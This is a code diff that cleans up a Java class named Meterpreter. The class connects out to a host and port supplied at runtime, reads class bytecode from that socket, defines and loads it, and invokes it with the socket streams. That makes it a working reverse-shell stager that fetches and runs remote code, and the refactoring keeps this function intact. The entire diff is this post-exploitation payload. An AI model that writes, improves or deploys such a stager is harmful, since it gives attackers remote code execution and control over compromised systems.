@@ -11,10 +11,6 @@ import java.util.HashMap;
 public class Meterpreter
         extends ClassLoader
         implements Runnable {
-    static /* synthetic */ Class class$0;
-    static /* synthetic */ Class class$1;
-    static /* synthetic */ Class class$2;
-
     static {
 
         Meterpreter meterpreter = new Meterpreter();
@@ -24,7 +20,7 @@ public class Meterpreter
 
     public String host;
     public String port;
-    private HashMap parameterMap;
+    private HashMap<String, byte[]> parameterMap;
 
     public static void main(String[] args) {
         Meterpreter meterpreter = new Meterpreter();
@@ -48,9 +44,13 @@ public class Meterpreter
         return "";
     }
 
+    @SuppressWarnings("unchecked")
     public boolean equals(Object paramObject) {
+        if (!(paramObject instanceof HashMap)) {
+            return false;
+        }
         try {
-            this.parameterMap = (HashMap) paramObject;
+            this.parameterMap = (HashMap<String, byte[]>) paramObject;
             this.host = this.get("host");
             this.port = this.get("port");
         } catch (Exception e) {
@@ -60,20 +60,19 @@ public class Meterpreter
     }
 
     public void getShell() throws Exception {
-        InputStream inputStream1 = null;
-        OutputStream outputStream = null;
-        int j = new Integer(this.port);
+        int j = Integer.parseInt(this.port);
         String str4 = this.host;
-        Socket socket = null;
-        if (str4 != null) {
-            socket = new Socket(str4, j);
+        if (str4 == null) {
+            return;
         }
-        inputStream1 = socket.getInputStream();
-        outputStream = socket.getOutputStream();
-        new Meterpreter().bootstrap(inputStream1, outputStream);
+        try (Socket socket = new Socket(str4, j)) {
+            InputStream inputStream1 = socket.getInputStream();
+            OutputStream outputStream = socket.getOutputStream();
+            new Meterpreter().bootstrap(inputStream1, outputStream);
+        }
     }
 
-    private final void bootstrap(InputStream paramInputStream, OutputStream paramOutputStream) throws Exception {
+    private void bootstrap(InputStream paramInputStream, OutputStream paramOutputStream) {
         try {
             Class<?> clazz;
             DataInputStream dataInputStream = new DataInputStream(paramInputStream);
@@ -84,53 +83,28 @@ public class Meterpreter
                 clazz = this.defineClass(null, arrayOfByte, 0, i);
                 this.resolveClass(clazz);
             } while ((i = dataInputStream.readInt()) > 0);
-            Object object = clazz.newInstance();
-            Class[] classArray = new Class[3];
-            Class<?> clazz2 = class$0;
-            if (clazz2 == null) {
-                try {
-                    clazz2 = class$0 = Class.forName("java.io.DataInputStream");
-                } catch (ClassNotFoundException classNotFoundException) {
-                    throw new NoClassDefFoundError(classNotFoundException.getMessage());
-                }
-            }
-            classArray[0] = clazz2;
-            Class<?> clazz3 = class$1;
-            if (clazz3 == null) {
-                try {
-                    clazz3 = class$1 = Class.forName("java.io.OutputStream");
-                } catch (ClassNotFoundException classNotFoundException) {
-                    throw new NoClassDefFoundError(classNotFoundException.getMessage());
-                }
-            }
-            classArray[1] = clazz3;
-            Class<?> clazz4 = class$2;
-            if (clazz4 == null) {
-                try {
-                    clazz4 = class$2 = Class.forName("[Ljava.lang.String;");
-                } catch (ClassNotFoundException classNotFoundException) {
-                    throw new NoClassDefFoundError(classNotFoundException.getMessage());
-                }
-            }
-            classArray[2] = clazz4;
-            clazz.getMethod("start", classArray).invoke(object, dataInputStream, paramOutputStream, new String[]{"", ""});
+            Object object = clazz.getDeclaredConstructor().newInstance();
+            clazz.getMethod("start", DataInputStream.class, OutputStream.class, String[].class)
+                .invoke(object, dataInputStream, paramOutputStream, new String[]{"", ""});
         } catch (Throwable throwable) {
             // empty catch block
         }
     }
 
+    @Override
+    @SuppressWarnings("CallToPrintStackTrace")
     public void run() {
         try {
             this.getShell();
         } catch (Exception exception) {
-            System.out.println(exception);
+            exception.printStackTrace();
             // empty catch block
         }
     }
 
     public String get(String key) {
         try {
-            return new String((byte[]) this.parameterMap.get(key));
+            return new String(this.parameterMap.get(key));
         } catch (Exception e) {
             return null;
         }
